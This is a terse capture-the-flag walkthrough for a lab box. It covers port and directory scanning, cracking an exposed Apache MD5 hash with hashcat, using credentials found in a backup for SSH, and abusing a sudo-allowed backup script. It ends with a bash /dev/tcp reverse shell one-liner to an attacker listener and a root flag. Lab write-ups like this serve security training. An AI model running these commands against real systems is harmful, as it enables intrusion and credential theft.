
```basic
┌──(kali㉿kali)-[~]
└─$ nmap -sV -A 10.10.19.1              
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 10:58 EDT
Nmap scan report for 10.10.19.1
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.20 seconds

```

http://10.10.19.1/etc/squid/passwd

```music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.```


```basic
┌──(kali㉿kali)-[~/dirsearch]
└─$ python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.19.1   
/home/kali/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.4) or chardet (4.0.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220520

Error Log: /home/kali/dirsearch/logs/errors-21-05-29_11-01-12.log

Target: http://10.10.19.1/

Output File: /home/kali/dirsearch/reports/10.10.19.1/_21-05-29_11-01-12.txt

[11:01:12] Starting: 
[11:01:15] 301 -  308B  - /admin  ->  http://10.10.19.1/admin/
[11:01:21] 301 -  306B  - /etc  ->  http://10.10.19.1/etc/
[11:10:12] 403 -  275B  - /server-status

Task Completed
  
  
  
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt                                                                                                   1 ⨯
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, 2195/2259 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward  
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Sat May 29 12:07:49 2021 (17 secs)
Time.Estimated...: Sat May 29 12:08:06 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2263 H/s (10.86ms) @ Accel:16 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 38976/14344384 (0.27%)
Rejected.........: 0/38976 (0.00%)
Restore.Point....: 38944/14344384 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidates.#1....: stella123 -> sextoy

Started: Sat May 29 12:07:41 2021
Stopped: Sat May 29 12:08:09 2021
```
 
 
so download borg,,, extracted backup with password from hashcat

```
┌──(kali㉿kali)-[~/Downloads/home/alex/Documents]
└─$ cat note.txt   
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
``` 
 
we get ssh access

sudo -l   reveals a backup.sh

we navigate to that directory /etc/mp3backups  and execute file, 

if you look at code there is a c flag that gives root

sudo ./backup.sh -c "/bin/bash"


seems like we got root but won't respond, 

we create a bash reverse shell

set up nc listner ,

```basic
export RHOST=10.6.65.43
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
```

 ```bash                                                                                                                                                                        
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lnvp 12345                                                                                                                                                   1 ⨯
listening on [any] 12345 ...
connect to [10.6.65.43] from (UNKNOWN) [10.10.19.124] 60536
root@ubuntu:/etc/mp3backups# cd /root
cd /root
root@ubuntu:/root# ls
ls
root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
root@ubuntu:/root#                                       ```                                                                                                                                 

